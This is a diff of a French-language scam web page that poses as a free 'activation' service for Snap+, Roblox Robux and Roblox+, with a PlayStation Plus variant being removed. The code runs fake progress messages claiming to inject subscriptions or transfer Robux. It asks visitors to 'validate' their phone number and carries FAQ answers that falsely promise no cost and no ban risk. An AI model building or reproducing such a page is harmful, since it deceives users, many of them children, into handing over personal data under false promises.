@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
@@ -17,7 +17,7 @@
             --primary: #cc33ff;
             --secondary: #ff0080;
             --accent: #ffb400;
-            --border-glow: rgba(255, 0, 128, 0.5);
+            --border-glow: rgba(255, 0, 255, 0.5);
             --shadow-glow: rgba(204, 51, 255, 0.4);
             --logo-bg: #fffc00;
             --text-glow: #df80ff;
@@ -34,19 +34,6 @@
             --shadow-glow: rgba(0, 170, 255, 0.4);
             --logo-bg: transparent;
             --text-glow: #80d4ff;
-        }
-
-        body.theme-playstation {
-            /* Thème PlayStation (Bleu Sony & Blanc) */
-            --bg-start: #000000;
-            --bg-end: #0f1419;
-            --primary: #003087;
-            --secondary: #0070cc;
-            --accent: #ffffff;
-            --border-glow: rgba(0, 112, 204, 0.5);
-            --shadow-glow: rgba(0, 112, 204, 0.4);
-            --logo-bg: transparent;
-            --text-glow: #66b3ff;
         }
 
         /* --- STYLE GÉNÉRAL --- */
@@ -200,35 +187,19 @@
         @keyframes pulseVIP { 0%, 100% { box-shadow: 0 0 10px rgba(0, 255, 128, 0.2); } 50% { box-shadow: 0 0 20px rgba(0, 255, 128, 0.6); } }
         @keyframes pulseDemo { 0%, 100% { box-shadow: 0 0 10px rgba(255, 204, 0, 0.2); } 50% { box-shadow: 0 0 20px rgba(255, 204, 0, 0.6); } }
 
-        /* --- SWITCHERS (MENUS LOGOS) --- */
+        /* --- SWITCHERS (MENUS) --- */
         .switcher-container {
-            display: flex; justify-content: center; align-items: center; 
-            gap: 25px; margin-bottom: 40px; flex-wrap: wrap;
+            display: flex; background: rgba(0,0,0,0.4); border-radius: 50px;
+            padding: 5px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.1);
         }
         .switch-btn {
-            display: flex; align-items: center; justify-content: center;
-            width: 65px; height: 65px; cursor: pointer;
-            border-radius: 50%; transition: all 0.4s ease;
-            border: 3px solid rgba(255, 255, 255, 0.2);
-            background: rgba(255, 255, 255, 0.05);
-            opacity: 0.6;
+            flex: 1; padding: 12px; text-align: center; font-weight: 800; font-size: 14px;
+            color: rgba(255,255,255,0.5); cursor: pointer; border-radius: 40px;
+            transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px;
         }
-        .switch-btn img {
-            width: 50px; height: 50px; object-fit: contain;
-            transition: transform 0.4s ease;
-        }
-        .switch-btn.active {
-            width: 85px; height: 85px; 
-            border-color: var(--primary); opacity: 1;
-            background: rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 25px var(--shadow-glow);
-        }
-        .switch-btn.active img {
-            transform: scale(1.2);
-        }
-        .switch-btn:hover:not(.active) {
-            opacity: 0.8; transform: scale(1.05);
-        }
+        .switch-btn.active { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; box-shadow: 0 0 15px var(--shadow-glow); }
+        
+        #sub-switcher-container { display: none; margin-top: -10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
 
         /* --- LOGO & TITRE --- */
         .logo-wrapper { position: relative; width: 140px; height: 140px; margin: 0 auto 30px; transition: transform 0.5s ease; }
@@ -275,10 +246,8 @@
         .custom-select-trigger {
             display: flex; justify-content: space-between; align-items: center; height: 58px; 
             padding: 0 18px; cursor: pointer; width: 100%; box-sizing: border-box;
-            flex-wrap: wrap;
         }
-        #offer-label { color: rgba(255, 255, 255, 0.5); font-size: 17px; transition: color 0.3s; flex: 1; text-align: left; }
-        .offer-sublabel { font-size: 12px; color: rgba(255, 255, 255, 0.4); margin-top: 2px; }
+        #offer-label { color: rgba(255, 255, 255, 0.5); font-size: 17px; transition: color 0.3s; }
         .select-arrow { pointer-events: none; display: flex; align-items: center; justify-content: center; transition: transform 0.3s ease; }
         .select-arrow svg { width: 16px; height: 16px; fill: rgba(255, 255, 255, 0.5); }
         
@@ -364,9 +333,6 @@
             .title { font-size: 20px; }
             .logo-wrapper { width: 120px; height: 120px; margin-bottom: 25px; }
             .plus-badge { width: 36px; height: 36px; font-size: 18px; }
-            .switcher-container { gap: 15px; }
-            .switch-btn { width: 55px; height: 55px; }
-            .switch-btn.active { width: 75px; height: 75px; }
         }
     </style>
 </head>
@@ -386,7 +352,7 @@
             </div>
 
             <div class="login-input-group" id="group-adminPass">
-                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v3z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                 <input type="password" id="adminPass" placeholder="Mot de passe">
             </div>
 
@@ -402,21 +368,14 @@
             
             <div id="admin-badge" class="admin-badge"></div>
 
-            <!-- MENU GLOBAL AVEC LOGOS -->
+            <!-- MENU GLOBAL -->
             <div class="switcher-container">
-                <div class="switch-btn active" id="btn-snap" onclick="setService('snap')">
-                    <img src="logosnapchat.png" alt="Snapchat">
-                </div>
-                <div class="switch-btn" id="btn-roblox" onclick="setService('roblox')">
-                    <img src="roblox.png" alt="Roblox">
-                </div>
-                <div class="switch-btn" id="btn-playstation" onclick="setService('playstation')">
-                    <img src="logoplaystation.png" alt="PlayStation">
-                </div>
+                <div class="switch-btn active" id="btn-snap" onclick="setService('snap')">Snapchat</div>
+                <div class="switch-btn" id="btn-roblox" onclick="setService('roblox')">Roblox</div>
             </div>
 
             <!-- SOUS-MENU ROBLOX -->
-            <div class="switcher-container" id="sub-switcher-container" data-service="roblox">
+            <div class="switcher-container" id="sub-switcher-container">
                 <div class="switch-btn active" id="btn-robux" onclick="setSubService('robux')">Générateur Robux</div>
                 <div class="switch-btn" id="btn-roblox-plus" onclick="setSubService('roblox_plus')">Roblox+</div>
             </div>
@@ -447,10 +406,7 @@
                 <div class="input-group dropdown-group" id="group-offer">
                     <input type="hidden" id="offer-select" value="">
                     <div class="custom-select-trigger" id="offer-trigger">
-                        <div style="display: flex; flex-direction: column; width: 100%; text-align: left;">
-                            <span id="offer-label">Sélectionner l'offre</span>
-                            <span class="offer-sublabel" id="offer-sublabel"></span>
-                        </div>
+                        <span id="offer-label">Sélectionner l'offre</span>
                         <div class="select-arrow"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></div>
                     </div>
                     <div class="custom-select-options" id="offer-options">
@@ -490,7 +446,7 @@
             <div class="info-box">
                 <div class="info-header">INFORMATION ℹ️</div>
                 <p class="info-text" id="info-text-box">
-                    Aucun frais ne vous sera prélevé. Notez que cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les utilisateurs sélectionnés par notre service.
+                    Aucun frais ne vous sera prélevé. Notez que cette offre est soumise à des critères d'éligibilité et n'est disponible que pour les utilisateurs sélectionnés par notre système.
                 </p>
             </div>
 
@@ -510,7 +466,7 @@
                 </a>
             </div>
 
-            <div class="patch-version">V1.55</div>
+            <div class="patch-version">V1.53</div>
 
         </div>
     </div>
@@ -519,8 +475,8 @@
         // ==========================================
         // 1. CONFIGURATION DYNAMIQUE (STATE MACHINE)
         // ==========================================
-        let currentService = 'snap'; // 'snap', 'roblox', ou 'playstation'
-        let currentSubService = 'robux'; // 'robux', 'roblox_plus', 'ps_essential', 'ps_extra', 'ps_premium'
+        let currentService = 'snap'; // 'snap' ou 'roblox'
+        let currentSubService = 'robux'; // 'robux' ou 'roblox_plus' (si roblox)
 
         const siteConfig = {
             snap: {
@@ -531,9 +487,9 @@
                 userPlaceholder: "Nom d'utilisateur Snapchat",
                 selectLabel: "Sélectionner l'offre",
                 options: [
-                    { value: "1", text: "1 mois Premium", sublabel: "Snap+" },
-                    { value: "3", text: "3 mois Premium", sublabel: "Snap+" },
-                    { value: "12", text: "12 mois Premium", sublabel: "Snap+" }
+                    { value: "1", text: "1 mois Premium" },
+                    { value: "3", text: "3 mois Premium" },
+                    { value: "12", text: "12 mois Premium" }
                 ],
                 loaderHtml: '<div style="font-size: 40px; margin-bottom: 10px; animation: spin 2s linear infinite;">⏳</div>',
                 successMsg: "Les fonctionnalités Snap+ seront disponibles sur votre compte d'ici quelques instants.",
@@ -545,9 +501,9 @@
                     { width: "100%", text: "Activation validée et établie !" }
                 ],
                 faq: [
-                    { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles sélectionnés par notre service." },
-                    { q: "Combien de temps prend l'activation de Snap+ ?", a: "Le processus d'analyse et de synchronisation prend environ 1 à 2 minutes. Une fois la barre à 100%, les fonctionnalités sont activées." },
-                    { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela sécurise votre compte." }
+                    { q: "Le service est-il vraiment gratuit ?", a: "Oui, l'activation initiale via notre plateforme est entièrement gratuite pour les utilisateurs éligibles sélectionnés par notre système." },
+                    { q: "Combien de temps prend l'activation de Snap+ ?", a: "Le processus d'analyse et de synchronisation prend environ 1 à 2 minutes. Une fois la barre à 100%, les fonctionnalités s'activent sur votre compte." },
+                    { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela nous permet de prévenir les abus." }
                 ]
             },
             roblox: {
@@ -559,9 +515,9 @@
                     userPlaceholder: "Pseudo Roblox",
                     selectLabel: "Sélectionner le montant",
                     options: [
-                        { value: "1700", text: "1 700 Robux", sublabel: "Générateur" },
-                        { value: "3150", text: "3 150 Robux", sublabel: "Générateur" },
-                        { value: "4500", text: "4 500 Robux", sublabel: "Générateur" }
+                        { value: "1700", text: "1 700 Robux" },
+                        { value: "3150", text: "3 150 Robux" },
+                        { value: "4500", text: "4 500 Robux" }
                     ],
                     loaderHtml: '<img src="robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
                     successMsg: "Les Robux seront crédités sur votre compte d'ici quelques instants.",
@@ -573,9 +529,9 @@
                         { width: "100%", text: "Transfert validé et établi !" }
                     ],
                     faq: [
-                        { q: "Combien de temps prend le transfert des Robux ?", a: "Le processus est très rapide. Une fois l'opération validée, les Robux sont généralement crédités en moins de 2 minutes." },
+                        { q: "Combien de temps prend le transfert des Robux ?", a: "Le processus est très rapide. Une fois l'opération validée, les Robux sont généralement crédités en moins de 5 minutes." },
                         { q: "Est-ce que mon compte Roblox risque d'être banni ?", a: "Non, notre système utilise des méthodes sécurisées pour simuler l'achat de crédits, aucune activité suspecte n'est détectée." },
-                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela sécurise votre compte." }
+                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela nous permet de garantir que les ressources vont à des humains." }
                     ]
                 },
                 roblox_plus: {
@@ -586,9 +542,9 @@
                     userPlaceholder: "Pseudo Roblox",
                     selectLabel: "Sélectionner l'offre",
                     options: [
-                        { value: "1", text: "1 mois Premium", sublabel: "Roblox+" },
-                        { value: "3", text: "3 mois Premium", sublabel: "Roblox+" },
-                        { value: "12", text: "12 mois Premium", sublabel: "Roblox+" }
+                        { value: "1", text: "1 mois Premium" },
+                        { value: "3", text: "3 mois Premium" },
+                        { value: "12", text: "12 mois Premium" }
                     ],
                     loaderHtml: '<img src="robux.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
                     successMsg: "L'abonnement Roblox+ sera activé sur votre compte d'ici quelques instants.",
@@ -605,83 +561,6 @@
                         { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire pour vérifier votre identité humaine et sécuriser l'attribution de l'abonnement." }
                     ]
                 }
-            },
-            playstation: {
-                ps_essential: {
-                    theme: 'theme-playstation',
-                    title: "ACTIVATION<br>PS+ ESSENTIAL",
-                    logo: "logoplaystation.png",
-                    plusText: "+",
-                    userPlaceholder: "Pseudo PSN",
-                    selectLabel: "Sélectionner l'offre",
-                    options: [
-                        { value: "1", text: "1 an PS+ Essential", sublabel: "Essential" }
-                    ],
-                    loaderHtml: '<img src="playstation-icon.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
-                    successMsg: "L'abonnement PS+ Essential sera activé sur votre compte PSN d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion sécurisée aux serveurs PlayStation..." },
-                        { width: "45%", text: "Identification du compte PSN..." },
-                        { width: "68%", text: "Injection de l'abonnement PS+ Essential..." },
-                        { width: "90%", text: "Synchronisation de l'activation..." },
-                        { width: "100%", text: "Activation validée et établie !" }
-                    ],
-                    faq: [
-                        { q: "Qu'est-ce que PS+ Essential ?", a: "PS+ Essential est le plan d'abonnement de base offrant l'accès au jeu en ligne multijoueur, des jeux gratuits mensuels et des réductions exclusives." },
-                        { q: "Combien de temps prend l'activation de PS+ Essential ?", a: "Le processus prend environ 1 à 2 minutes. Une fois la barre à 100%, votre abonnement PS+ Essential est activé." },
-                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela sécurise votre compte PSN." }
-                    ]
-                },
-                ps_extra: {
-                    theme: 'theme-playstation',
-                    title: "ACTIVATION<br>PS+ EXTRA",
-                    logo: "logoplaystation.png",
-                    plusText: "+",
-                    userPlaceholder: "Pseudo PSN",
-                    selectLabel: "Sélectionner l'offre",
-                    options: [
-                        { value: "2", text: "1 an PS+ Extra", sublabel: "Extra" }
-                    ],
-                    loaderHtml: '<img src="playstation-icon.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
-                    successMsg: "L'abonnement PS+ Extra sera activé sur votre compte PSN d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion sécurisée aux serveurs PlayStation..." },
-                        { width: "45%", text: "Identification du compte PSN..." },
-                        { width: "68%", text: "Injection de l'abonnement PS+ Extra..." },
-                        { width: "90%", text: "Synchronisation de l'activation..." },
-                        { width: "100%", text: "Activation validée et établie !" }
-                    ],
-                    faq: [
-                        { q: "Qu'est-ce que PS+ Extra ?", a: "PS+ Extra inclut tous les avantages de PS+ Essential plus une bibliothèque de jeux PS5 et PS4 améliorée." },
-                        { q: "Quel est la différence entre PS+ Essential et PS+ Extra ?", a: "PS+ Extra offre une plus grande bibliothèque de jeux, environ 400 titres PS5 et PS4 supplémentaires comparé à Essential." },
-                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela sécurise votre compte PSN." }
-                    ]
-                },
-                ps_premium: {
-                    theme: 'theme-playstation',
-                    title: "ACTIVATION<br>PS+ PREMIUM",
-                    logo: "logoplaystation.png",
-                    plusText: "+",
-                    userPlaceholder: "Pseudo PSN",
-                    selectLabel: "Sélectionner l'offre",
-                    options: [
-                        { value: "3", text: "1 an PS+ Premium", sublabel: "Premium" }
-                    ],
-                    loaderHtml: '<img src="playstation-icon.png" style="width: 55px; margin-bottom: 10px; animation: spin 2s linear infinite;">',
-                    successMsg: "L'abonnement PS+ Premium sera activé sur votre compte PSN d'ici quelques instants.",
-                    progressSteps: [
-                        { width: "20%", text: "Connexion sécurisée aux serveurs PlayStation..." },
-                        { width: "45%", text: "Identification du compte PSN..." },
-                        { width: "68%", text: "Injection de l'abonnement PS+ Premium..." },
-                        { width: "90%", text: "Synchronisation de l'activation..." },
-                        { width: "100%", text: "Activation validée et établie !" }
-                    ],
-                    faq: [
-                        { q: "Qu'est-ce que PS+ Premium ?", a: "PS+ Premium est le plan d'abonnement haut de gamme incluant tous les avantages de PS+ Extra plus l'accès à plus de 700 jeux PlayStation 1-4." },
-                        { q: "Quel est le catalogue de jeux disponibles sur PS+ Premium ?", a: "PS+ Premium offre accès à plus de 700 jeux PS1, PS2, PS3, PS4 et PS5, avec des nouveaux titres ajoutés régulièrement." },
-                        { q: "Pourquoi dois-je valider mon numéro de téléphone ?", a: "Cette étape est obligatoire afin de vérifier que vous êtes bien un utilisateur réel et non un robot. Cela sécurise votre compte PSN." }
-                    ]
-                }
             }
         };
 
@@ -694,52 +573,34 @@
             // Gestion UI Boutons Principaux
             document.getElementById('btn-snap').classList.toggle('active', service === 'snap');
             document.getElementById('btn-roblox').classList.toggle('active', service === 'roblox');
-            document.getElementById('btn-playstation').classList.toggle('active', service === 'playstation');
             
             // Gestion d'affichage Sous-Menu
-            const subMenuRoblox = document.getElementById('sub-switcher-container');
-            
+            const subMenu = document.getElementById('sub-switcher-container');
             if (service === 'roblox') {
-                subMenuRoblox.style.display = 'flex';
+                subMenu.style.display = 'flex';
                 setSubService('robux'); // Par défaut
             } else {
-                subMenuRoblox.style.display = 'none';
-                if (service === 'playstation') {
-                    setSubService('ps_essential'); // Par défaut PlayStation
-                } else {
-                    applyConfig();
-                }
+                subMenu.style.display = 'none';
+                applyConfig();
             }
         }
 
         function setSubService(subService) {
             currentSubService = subService;
-            
-            // Mise à jour des boutons Roblox
-            if (subService === 'robux' || subService === 'roblox_plus') {
-                document.getElementById('btn-robux').classList.toggle('active', subService === 'robux');
-                document.getElementById('btn-roblox-plus').classList.toggle('active', subService === 'roblox_plus');
-            }
-            
+            document.getElementById('btn-robux').classList.toggle('active', subService === 'robux');
+            document.getElementById('btn-roblox-plus').classList.toggle('active', subService === 'roblox_plus');
             applyConfig();
         }
 
         function applyConfig() {
             let activeConfig;
-            let theme = 'theme-snap';
-            
             if (currentService === 'snap') {
                 activeConfig = siteConfig.snap;
-                theme = '';
-            } else if (currentService === 'roblox') {
+                document.body.className = '';
+            } else {
                 activeConfig = siteConfig.roblox[currentSubService];
-                theme = 'theme-roblox';
-            } else if (currentService === 'playstation') {
-                activeConfig = siteConfig.playstation[currentSubService];
-                theme = 'theme-playstation';
+                document.body.className = 'theme-roblox';
             }
-            
-            document.body.className = theme;
 
             // Textes et Images
             document.getElementById('main-title').innerHTML = activeConfig.title;
@@ -758,7 +619,6 @@
             const offerLabel = document.getElementById('offer-label');
             offerLabel.textContent = activeConfig.selectLabel;
             offerLabel.style.color = "rgba(255, 255, 255, 0.5)";
-            document.getElementById('offer-sublabel').textContent = "";
             document.getElementById('offer-select').value = "";
             
             const optionsContainer = document.getElementById('offer-options');
@@ -768,7 +628,7 @@
                 div.className = 'custom-option';
                 div.setAttribute('data-value', opt.value);
                 div.textContent = opt.text;
-                div.onclick = (e) => selectOption(e, opt.value, opt.text, opt.sublabel);
+                div.onclick = (e) => selectOption(e, opt.value, opt.text);
                 optionsContainer.appendChild(div);
             });
 
@@ -892,11 +752,10 @@
             e.stopPropagation();
         });
 
-        function selectOption(e, value, text, sublabel) {
+        function selectOption(e, value, text) {
             const offerLabel = document.getElementById('offer-label');
             offerLabel.textContent = text;
             offerLabel.style.color = 'white';
-            document.getElementById('offer-sublabel').textContent = sublabel;
             document.getElementById('offer-select').value = value;
             offerOptions.classList.remove('open');
             offerTrigger.classList.remove('open');
@@ -966,15 +825,7 @@
             const msg = document.getElementById('status-msg');
             
             // Récupère les textes de chargement selon la config actuelle
-            let activeConfig;
-            if (currentService === 'snap') {
-                activeConfig = siteConfig.snap;
-            } else if (currentService === 'roblox') {
-                activeConfig = siteConfig.roblox[currentSubService];
-            } else if (currentService === 'playstation') {
-                activeConfig = siteConfig.playstation[currentSubService];
-            }
-            
+            const activeConfig = currentService === 'snap' ? siteConfig.snap : siteConfig.roblox[currentSubService];
             const steps = activeConfig.progressSteps;
 
             let i = 0;
